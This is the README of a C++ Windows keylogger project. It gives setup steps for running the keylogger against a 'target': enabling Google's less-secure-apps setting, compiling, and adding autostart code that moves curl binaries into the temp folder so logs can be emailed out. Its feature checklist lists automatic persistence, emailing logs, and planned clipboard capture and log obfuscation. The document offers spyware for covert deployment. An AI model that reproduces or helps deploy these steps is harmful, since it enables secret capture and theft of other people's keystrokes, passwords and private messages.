## Default Instalation:
* Enable the [less secure apps](https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4MGU5z42UW4nH0dAY8_FeWykqble-hNWbVnZX6rX9boPYuAtJ6h3Hps1rZt7aL17kNzR-R_m8pDgmLYmagc5mzRVeC2Zg)
* Set the const strings in .cpp
* Compile it
* Run the keylogger
* Enjoy

## Instalation if ur target use windows older than 1706
* In the function send() in string "cmd" add .exe after "curl"
* Add in the function autostart() 
``` 
file << "move curl.exe %temp%\n";
file << "move curl-ca-bundle.crt %temp%\n";
file << "move libcurl-x64.def %temp%\n";
file << "move libcurl-x64.dll %temp%\n";   
```
* To same directory where keylogger is gonna boot first time  put files from /bin/ from [curl for windows](https://curl.se/windows/) (32bit version)
* Back to Deafault Instalation

- [x] automaticly adding to autostart
- [x] sending logs on email
- [x] Logging every half an hour date
- [ ] Logging Clipboard
- [ ] xoring a logs



if you don't need all of these features, just keylogger - checkout my older keylogger project



